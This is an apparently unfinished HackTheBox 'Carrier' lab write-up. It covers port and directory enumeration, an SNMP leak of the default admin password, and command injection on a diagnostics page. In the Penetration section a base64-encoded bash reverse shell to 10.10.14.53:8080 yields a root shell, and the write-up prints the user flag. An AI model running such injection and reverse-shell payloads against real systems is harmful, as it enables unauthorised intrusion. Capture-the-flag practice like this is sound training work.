# HackTheBox | Carrier Write-up

*October 13, 2018*

Author: Jane Wilde (wilde)



[TOC]

| Severity Level   | **<span style="color: red"></span>** |
| ---------------- | ------------------------------------ |
| **Access level** | **Method**                           |
| User             |                                      |
| Root             |                                      |

<div style="page-break-after: always;"></div>

#Recap



<div style="page-break-after: always;"></div>

# Service Enumeration

##nmap

A quick `nmap` scan gives:

```
nmap -sT -sU carrier 10.10.10.105
```

```
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-20 13:56 EDT
Nmap scan report for 10.10.10.105
Host is up (0.030s latency).
Not shown: 999 open|filtered ports, 997 closed ports
PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  open     ssh
80/tcp  open     http
161/udp open     snmp
```

Visiting the web page:

![image-20181020200416302](/Users/janne/Library/Application Support/typora-user-images/image-20181020200416302.png)

```
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.105/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/10/20 13:44:29 Starting gobuster
=====================================================
/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/debug (Status: 301)
```

`/doc/error_codes.pdf` states a few error codes:

![image-20181020200321095](/Users/janne/Library/Application Support/typora-user-images/image-20181020200321095.png)



```
snmpwalk 10.10.10.105 -c public -v 2c
```

```
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Default login:

User: `admin`

Password: `NET_45JDX23`

![image-20181020200214750](/Users/janne/Library/Application Support/typora-user-images/image-20181020200214750.png)

# Penetration

##User access

On the `diagnostics` page, a php script is run that accepts a base64 encoded command. So let's append:

`quagga && bash -i >& /dev/tcp/10.10.14.53/8080 0>&1`

`cXVhZ2dhICYmIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTMvODA4MCAwPiYx`

```
nc -lvp 8080
Connection from 10.10.10.105:38820
bash: cannot set terminal process group (25589): Inappropriate ioctl for device
bash: no job control in this shell
root@r1:~#
```

We're in. The user flag:

> Milestone: user.txt flag: 5649c41df59fd6efdc4a78d79a07f2be

##Root access

#### Network enumeration

```
eth0      Link encap:Ethernet  HWaddr 00:16:3e:d9:04:ea
          inet addr:10.99.64.2  Bcast:10.99.64.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fed9:4ea/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:16446 errors:0 dropped:0 overruns:0 frame:0
          TX packets:17423 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:3011016 (3.0 MB)  TX bytes:3893781 (3.8 MB)

eth1      Link encap:Ethernet  HWaddr 00:16:3e:8a:f2:4f
          inet addr:10.78.10.1  Bcast:10.78.10.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe8a:f24f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:139 errors:0 dropped:0 overruns:0 frame:0
          TX packets:119 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:9842 (9.8 KB)  TX bytes:8789 (8.7 KB)

eth2      Link encap:Ethernet  HWaddr 00:16:3e:20:98:df
          inet addr:10.78.11.1  Bcast:10.78.11.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe20:98df/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:281 errors:0 dropped:0 overruns:0 frame:0
          TX packets:268 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:21852 (21.8 KB)  TX bytes:19532 (19.5 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:374 errors:0 dropped:0 overruns:0 frame:0
          TX packets:374 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:33080 (33.0 KB)  TX bytes:33080 (33.0 KB)
```

###nmap binary

Serving an `nmap` binary to the machine:

```
root@r1:~/.tmp# ./nmap 10.99.64.2
./nmap 10.99.64.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-10-21 21:32 UTC
Unable to find nmap-services!  Resorting to /etc/services
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.99.64.2
Host is up (0.000046s latency).
Not shown: 1203 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp
```

```
root@r1:~/.tmp# ./nmap 10.78.10.1
./nmap 10.78.10.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-10-21 21:33 UTC
Unable to find nmap-services!  Resorting to /etc/services
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.78.10.1
Host is up (0.000021s latency).
Not shown: 1203 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp
```

```
root@r1:~/.tmp# ./nmap 10.78.11.1
./nmap 10.78.11.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-10-21 21:33 UTC
Unable to find nmap-services!  Resorting to /etc/services
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.78.11.1
Host is up (0.000010s latency).
Not shown: 1203 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp
```

All machines have both `ssh` and `bgp` ports open.











```
root@r1:~# cd /etc/cloud
cd /etc/cloud
root@r1:/etc/cloud# ls
ls
build.info
cloud.cfg
cloud.cfg.d
templates
root@r1:/etc/cloud# cat cloud.cfg
cat cloud.cfg
# The top level settings are used as module
# and system configuration.

# A set of users which may be applied and/or used by various modules
# when a 'default' entry is found it will reference the 'default_user'
# from the distro configuration specified below
users:
   - default

# If this is set, 'root' will not be able to ssh in and they
# will get a message to login instead as the default $user
disable_root: true

# This will cause the set+update hostname module to not operate (if true)
preserve_hostname: false

# Example datasource config
# datasource:
#    Ec2:
#      metadata_urls: [ 'blah.com' ]
#      timeout: 5 # (defaults to 50 seconds)
#      max_wait: 10 # (defaults to 120 seconds)

# The modules that run in the 'init' stage
cloud_init_modules:
 - migrator
 - seed_random
 - bootcmd
 - write-files
 - growpart
 - resizefs
 - disk_setup
 - mounts
 - set_hostname
 - update_hostname
 - update_etc_hosts
 - ca-certs
 - rsyslog
 - users-groups
 - ssh

# The modules that run in the 'config' stage
cloud_config_modules:
# Emit the cloud config ready event
# this can be used by upstart jobs for 'start on cloud-config'.
 - emit_upstart
 - snap
 - snap_config  # DEPRECATED- Drop in version 18.2
 - ssh-import-id
 - locale
 - set-passwords
 - grub-dpkg
 - apt-pipelining
 - apt-configure
 - ubuntu-advantage
 - ntp
 - timezone
 - disable-ec2-metadata
 - runcmd
 - byobu

# The modules that run in the 'final' stage
cloud_final_modules:
 - snappy  # DEPRECATED- Drop in version 18.2
 - package-update-upgrade-install
 - fan
 - landscape
 - lxd
 - puppet
 - chef
 - mcollective
 - salt-minion
 - rightscale_userdata
 - scripts-vendor
 - scripts-per-once
 - scripts-per-boot
 - scripts-per-instance
 - scripts-user
 - ssh-authkey-fingerprints
 - keys-to-console
 - phone-home
 - final-message
 - power-state-change

# System and/or distro specific settings
# (not accessible to handlers/transforms)
system_info:
   # This will affect which distro class gets used
   distro: ubuntu
   # Default user name + that default users groups (if added/used)
   default_user:
     name: ubuntu
     lock_passwd: True
     gecos: Ubuntu
     groups: [adm, audio, cdrom, dialout, dip, floppy, lxd, netdev, plugdev, sudo, video]
     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
     shell: /bin/bash
   # Other config here will be given to the distro class and/or path classes
   paths:
      cloud_dir: /var/lib/cloud/
      templates_dir: /etc/cloud/templates/
      upstart_dir: /etc/init/
   package_mirrors:
     - arches: [i386, amd64]
       failsafe:
         primary: http://archive.ubuntu.com/ubuntu
         security: http://security.ubuntu.com/ubuntu
       search:
         primary:
           - http://%(ec2_region)s.ec2.archive.ubuntu.com/ubuntu/
           - http://%(availability_zone)s.clouds.archive.ubuntu.com/ubuntu/
           - http://%(region)s.clouds.archive.ubuntu.com/ubuntu/
         security: []
     - arches: [armhf, armel, default]
       failsafe:
         primary: http://ports.ubuntu.com/ubuntu-ports
         security: http://ports.ubuntu.com/ubuntu-ports
   ssh_svcname: ssh
```





quagga

```
cat /etc/quagga/bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```





```

```